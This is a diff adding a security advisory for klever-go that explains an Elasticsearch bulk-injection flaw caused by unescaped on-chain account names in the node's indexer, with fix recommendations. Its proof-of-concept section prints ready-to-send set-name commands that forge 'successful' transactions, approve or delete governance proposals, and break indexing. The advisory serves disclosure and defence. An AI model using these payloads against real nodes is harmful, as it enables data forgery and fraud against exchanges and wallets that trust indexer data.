@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-7c7c-373r-gfjj",
+  "modified": "2026-09-23T21:45:08.884955444Z",
+  "published": "2026-09-23T21:24:06Z",
+  "aliases": [
+    "CVE-2026-82409"
+  ],
+  "summary": "Klever-Go: Elasticsearch bulk / painless injection via on-chain account name -\u003e explorer/indexer data forgery",
+  "details": "**Component:** Elasticsearch indexer (`indexer/`)\n**Primary location:** `indexer/common.go:2395-2407` (`serializedDataForUpdateAccounts`)\n**Entry point:** `SetAccountName` native transaction (contract type 12) — `core/process/transaction/txProcess.go:688`\n\n---\n\n## Description\n\nWhen the node indexes account updates to Elasticsearch, it builds the ES `_bulk` painless-script line by splicing the account's **name** directly into JSON with `fmt.Sprintf(\"%s\", ...)` and **no escaping**:\n\n```go\n// indexer/common.go:2395-2407  (serializedDataForUpdateAccounts)\nserializedData := []byte(fmt.Sprintf(`{\"script\":{\"source\":\"`+\n    `ctx._source.name = params.name; ... `+\n    `\",\"lang\": \"painless\",\"params\":`+\n    `{\"name\": \"%s\", \"nonce\": %d, \"rootHash\": \"%s\", \"balance\": %d, ...}}}`,\n    acc.Name, acc.Nonce, acc.RootHash, acc.Balance, ...))   // acc.Name is RAW\n```\n\n`acc.Name` originates from on-chain account state: `indexer/accountInfo.go:31` sets `Name: string(userAccount.GetName())`. An account name is fully attacker-controlled and only weakly validated when it is set on-chain by the `SetAccountName` handler:\n\n```go\n// core/kapp/accounts/accounts.go:1740\nif !utf8.Valid(tc.GetName()) || len(tc.GetName()) \u003e core.MaxNameSize { ... }  // MaxNameSize = 100\n```\n\nThe only constraints are **valid UTF-8** and **length ≤ 100 bytes**. Double-quote (`\"`), backslash (`\\`), and newline (`\\n`) are all valid UTF-8 and are **not** rejected. The safe helper `converters.JsonEscape()` exists and is used for `_id` fields elsewhere in the same file (`common.go:893`, `:932`, `:961`) but is **not** applied to the name.\n\nThe resulting buffer is POSTed verbatim to Elasticsearch `_bulk` by `elasticClient.DoBulkRequest` (`indexer/elasticClient.go:128`), with the index in the URL. The `_bulk` body is NDJSON — newline-delimited action/source pairs (`indexer/data/buffer.go:45` appends a `\\n` after every entry). Therefore a name containing a quote and newlines can \n\n- inject arbitrary keys/structure into the document, \n- break the batch, and \n- inject entirely new bulk operations targeting **other** documents and **other** indices.\n\n`SetAccountName` is a first-class transaction contract type (`= 12`) dispatched natively at `txProcess.go:688` via `SetAccountName(tx.GetSender(), tc)`. The attacker names **their own** account with the payload in one ordinary signed transaction (normal fee, no contract deploy, no VM gas). (It is additionally exposed as a VM built-in `KleverSetAccountName`, but that path is not needed.)\n\nThe name is written into consensus account state (`userAccount.SetName`, `data/state/userAccount.go:76`) and replicated to all nodes. The indexer reads it from **state**, not from the transaction, during each node's own block processing (`core/process/block/block.go:1141` `SaveBlock` / `SaveAccounts`). Consequently:\n\n- The attacker does not need any access to the node running the indexer, the ES port, or validator status. One broadcast to the network is enough.\n- Indexers typically run on **observer/gateway** nodes that power the public explorer/API — exactly the realistic victim.\n- The payload is **durable and replayable**: a newly stood-up indexer, or a historical re-index (import-DB mode, `cmd/node/startup.go:153`), re-reads the name from state and re-fires the injection.\n\n### Escalation — from denial-of-indexing to arbitrary ES document CRUD\n\nElasticsearch `_bulk` fails a malformed line differently by position: malformed **action** line → whole-batch HTTP 400 (nothing applies); malformed **source** line → **per-item** error (other items still apply). By appending a *sacrificial* action after the forged op, the serializer's fixed template tail (`\", \"nonce\":...}}}`) lands in a source position (item-level error), so a clean forged op that precedes it is **applied**. This yields arbitrary create / overwrite / delete of documents in **any** index the indexer's ES credentials can write — cross-index via `{\"index\":{\"_index\":\"...\", \"_id\":\"...\"}}`.\n\n### Deployment amplifier (default ES config)\n\nThe Elasticsearch config klever ships (`docker/elasticsearch/elasticsearch.yml`, `docker/docker-compose.yml`) sets `xpack.security.enabled: false`, `network.host: 0.0.0.0`, publishes `9200:9200`, and CORS `*` with `POST,PUT,DELETE`. The node's default `config/node/external.yaml` connects with empty `username`/`password`. So the indexer writes to ES unauthenticated, and if ES is network-reachable it is itself fully open. Crucially, even when an operator firewalls ES to localhost, **this injection is the remote bridge** that reaches that private ES through the node's own trusted connection.\n\n---\n\n## POC\n\nThe entire attack is a **single `SetAccountName` transaction** the attacker sends from any funded account, naming its **own** account with a crafted payload. \n\n```\noperator --node=http://\u003cnode\u003e:8099 -k attacker.pem --sign account set-name \\\n  $'\"}}}\\n{\"index\":{\"_index\":\"transactions\",\"_id\":\"t\"}}\\n{\"status\":\"success\"}\\n{\"index\":{}}'\n```\n\nThis submits contract type 12 (`SetAccountNameContract`) with:\n\n```\nName = \"}}}⏎{\"index\":{\"_index\":\"transactions\",\"_id\":\"t\"}}⏎{\"status\":\"success\"}⏎{\"index\":{}}\n```\n(84 bytes ≤ MaxNameSize 100; `⏎` = literal `\\n`. On-chain `Name` is `[]byte`, i.e.\nbase64 `In19fQp7ImluZGV4Ijp7Il9pbmRleCI6InRyYW5zYWN0aW9ucyIsIl9pZCI6InQifX0KeyJzdGF0dXMiOiJzdWNjZXNzIn0KeyJpbmRleCI6e319`.)\n\n\n```\n{ \"update\": { \"_index\":\"accounts\", \"_id\":\"\u003cattacker\u003e\" } }\n{\"script\":{ ... ,\"params\":{\"name\": \"\"}}}\n{\"index\":{\"_index\":\"transactions\",\"_id\":\"t\"}}    ← forged bulk action\n{\"status\":\"success\"}                             ← forged doc → written to `transactions`\n{\"index\":{}}\", \"nonce\":1, ... }}}                ← sacrificial op absorbs the template tail\n```\n\n**Observed result:** a forged document `{\"status\":\"success\"}` with `_id:\"t\"` appears in the `transactions` index — the attacker never submitted any such transaction:\n\n```\nGET transactions/_doc/t\n\n{ \"found\": true, \"_source\": { \"status\": \"success\" } }\n```\n\n### Escalation variants — same delivery, only the `Name` changes\n\nEach is a single `SetAccountName` tx sent the same way; only the payload differs.\n\n**Denial-of-indexing** (2-byte name — breaks the batch, drops every co-batched account update):\n```\noperator --node=http://\u003cnode\u003e:8099 -k attacker.pem --sign account set-name 'x\"'\n```\n\n**Cross-index write / forge a document** (e.g. a governance proposal doc; 82 bytes):\n```\noperator --node=http://\u003cnode\u003e:8099 -k attacker.pem --sign account set-name \\\n  $'\"}}}\\n{\"index\":{\"_index\":\"proposals\",\"_id\":\"5\"}}\\n{\"status\":\"approved\"}\\n{\"index\":{}}'\n```\n\n**Delete a document** (e.g. proposal id 5; 61 bytes):\n```\noperator --node=http://\u003cnode\u003e:8099 -k attacker.pem --sign account set-name \\\n  $'\"}}}\\n{\"delete\":{\"_index\":\"proposals\",\"_id\":\"5\"}}\\n{\"index\":{}}'\n```\n\n\n\n---\n\n## Impact\n\nA single, cheap, permissionless on-chain transaction (one tx fee; no contract, no special role, no access to the indexing host) lets an attacker inject into the Elasticsearch `_bulk` stream of **every node that indexes the chain** now or in the future. Two tiers of impact:\n\n1. **Denial-of-indexing** A name containing a single `\"` or newline makes ES reject the whole bulk batch (HTTP 400). Because the indexer batches many accounts per bulk (up to 4 MB), every co-batched honest account's balance/name/nonce update is silently **dropped** → the explorer/API serves **stale** data. Repeatable every block.\n\n2. **Arbitrary document CRUD across all indexer indices (escalation).** Using the sacrificial-op construction, the attacker can **create/overwrite/delete** documents in any klever index the indexer writes (`transactions`, `blocks`, `accounts`, `proposals`, `assets`, `marketplaces`, ...): forge \"successful\" transactions, rewrite balances, delete or rewrite blocks and governance proposals. Anyone trusting the ES-backed API , wallets, block explorers, or an exchange crediting deposits off indexer data  can be fed fabricated records, enabling fraud (e.g. a forged `status:success` transaction).\n\n**Amplifiers:** the payload is permanent replicated state, so it hits any current or future indexer and survives re-indexing; the attacker is fully decoupled from the victim indexer; and the shipped ES config is unauthenticated.\n\n\n---\n\n## Recommendation\n\n1. **Escape the name .** Never splice on-chain strings into JSON with `fmt.Sprintf`. Either apply the existing `converters.JsonEscape()` to `acc.Name` (mirror the `_id` handling), or preferably  build the entire bulk source with `json.Marshal` of a typed struct so no on-chain string can break the JSON/NDJSON structure. Audit every `fmt.Sprintf`-built bulk/script line in `indexer/common.go` for the same pattern (RootHash and other `%s` fields on this and nearby paths).\n\n2. **Restrict the on-chain account-name charset** at `SetAccountName` (`accounts.go:1740`)  reject control characters, quotes, and backslashes (or allow only a safe printable subset) as defense-in-depth. Gate any consensus-visible validation change behind an epoch fork flag.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/klever-io/klever-go",
+        "purl": "pkg:golang/github.com/klever-io/klever-go"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.20"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.7.19",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-7c7c-373r-gfjj/GHSA-7c7c-373r-gfjj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/security/advisories/GHSA-7c7c-373r-gfjj"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/commit/f00366768b24be18fa7ae9de2e1905caa8b350af"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/commit/f54ea730cc80a3ba4f906586a7d221b281548190"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/klever-io/klever-go"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klever-io/klever-go/releases/tag/v1.7.20"
+    }
+  ]
+}
